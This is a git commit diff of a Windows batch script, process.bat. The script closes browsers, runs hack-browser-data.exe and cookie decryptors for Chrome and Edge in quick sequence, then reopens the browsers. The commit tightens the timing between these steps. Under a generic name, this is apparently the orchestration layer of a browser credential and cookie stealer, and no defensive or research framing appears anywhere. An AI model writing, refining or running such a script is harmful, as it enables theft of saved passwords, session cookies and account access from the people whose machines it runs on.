de48d0e0cd570bc5735273d24d4a71c7064f0459
24-20 <106987713+24-20@users.noreply.github.com>
2024-12-13 01:10:03 +0100

    Update process.bat

--- bigboyfolder/process.bat
+++ bigboyfolder/process.bat
@@ -1,6 +1,3 @@
-REM =====================
-REM process.bat
-REM =====================
 @echo off
 setlocal EnableDelayedExpansion
 cd "%~dp0"
@@ -11,16 +8,23 @@ echo Running from directory: %CD%
 REM Run stop_browsers
 call stop_browsers.bat
 
-REM Wait for browsers to close
-timeout /t 3 /nobreak
-echo Running application...
+REM Brief wait for browsers to close
+timeout /t 1 /nobreak
 
-REM Run the exe and wait a bit longer
+echo Running applications sequentially...
+
+REM Run each exe immediately after the previous one finishes
 "%CD%\hack-browser-data.exe"
+timeout /t 0.5 /nobreak
+
 "%CD%\chrome_cookie_decryptor.exe"
+timeout /t 0.5 /nobreak
+
 "%CD%\edge_cookie_decryptor.exe"
-echo [DEBUG] Waiting for results to be generated...
-timeout /t 5 /nobreak
+timeout /t 0.5 /nobreak
+
+REM Quick final wait
+timeout /t 1 /nobreak
 
 REM Start browsers
 call start_browsers.bat
